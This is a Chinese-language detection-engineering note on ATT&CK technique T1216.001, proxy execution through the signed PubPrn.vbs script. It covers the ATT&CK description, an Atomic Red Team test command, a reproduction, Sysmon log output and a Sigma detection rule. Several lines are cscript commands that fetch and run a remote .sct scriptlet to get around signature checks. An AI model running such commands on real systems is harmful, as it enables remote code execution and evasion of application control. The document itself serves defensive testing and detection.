# T1216-001-win-签名脚本代理执行-PubPrn

## 来自ATT&CK的描述

攻击者可能会使用 PubPrn 来代理恶意远程文件的执行。PubPrn.vbs 是一个将打印机发布到 Active Directory 域服务的Visual Basic脚本。该脚本由 Microsoft 签名，通常通过Windows shell `Cscript.exe`. 例如，以下代码在指定域内发布打印机：`cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com`。

 攻击者可能会滥用PubPrn来执行托管在远程站点上的恶意负载。为此，攻击者可以设置第二个`script:`参数以引用托管在远程站点上的脚本文件 (.sct)。一个示例命令`pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct`. 此行为可能会绕过签名验证限制和不考虑滥用此脚本的应用程序控制。

在更高版本的 Windows (10+) 中，`PubPrn.vbs`已更新，防止从远程站点执行代理。这是通过将第二个参数中指定的协议限制为来完成的，也就是可用于通过 HTTP(S) 引用远程代码`LDAP://`的`script:`绰号。

## 测试案例

### 测试1 PubPrn.vbs Signed Script Bypass
执行已签名的PubPrn.vbs脚本，该脚本可以下载和执行任意有效载荷。
攻击命令，Windows命令行执行即可。
```
cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}"
```

remote_payload：<https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct>

## 检测日志

Windows 安全日志、Sysmon日志

## 测试复现
### 测试1 PubPrn.vbs Signed Script Bypass
```
C:\Users\Administrator.ZHULI>cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs localhost "script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct"
```

注意操作系统语言，语言不同，VBS脚本所在位置不同
## 测试留痕
Windows Sysmon日志
```      
Process Create: 事件ID 1进程创建

RuleName: technique_id=T1059,technique_name=Command-Line Interface

UtcTime: 2022-01-11 08:05:07.983

ProcessGuid: {78c84c47-3a33-61dd-3924-000000000800}

ProcessId: 2000

Image: C:\Windows\System32\cscript.exe

FileVersion: 5.812.10240.16384

Description: Microsoft 

Product: Microsoft ® Windows Script Host

Company: Microsoft Corporation

OriginalFileName: cscript.exe

CommandLine: cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs localhost "script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct"

CurrentDirectory: C:\Users\Administrator.ZHULI\

User: ZHULI\Administrator

LogonGuid: {78c84c47-f665-61db-95da-440100000000}

LogonId: 0x144DA95

TerminalSessionId: 3

IntegrityLevel: High

Hashes: SHA1=0E3C0779D8EAAD3B00363D7890DDC8272B510D49,MD5=A45586B3A5A291516CD10EF4FD3EE768,SHA256=59D3CDC7D51FA34C6B27B8B04EA17992955466EB25022B7BD64880AB35DF0BBC,IMPHASH=2B44D2206B9865383429E9C1524F1CAC

ParentProcessGuid: {78c84c47-2489-61dd-f120-000000000800}

ParentProcessId: 4392

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: "C:\Windows\system32\cmd.exe" 

ParentUser: ZHULI\Administrator
```

## 检测规则/思路

### Sigma规则

```yml
title: 使用PubPrn.vbs脚本绕过检测
status: experimental
author: 12306Br0
date: 2022/01/11
references:
    - attack.t1216.001
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 1 #sysmon日志，进程创建
		CommandLine: 
		      - '*\Printing_Admin_Scripts\*\pubprn.vbs' #进程命令行
			  - 'https:*'
			  - '*.sct' 
    condition: selection
level: low
```

### 建议

监视脚本进程，例如`cscript`，以及脚本的命令行参数，例如可用于代理恶意文件执行的PubPrn.vbs。

## 参考推荐

MITRE-ATT&CK-T1216-001

<https://attack.mitre.org/techniques/T1216/001/>

Atomic-red-team-T1216.001

<https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216.001/T1216.001.md>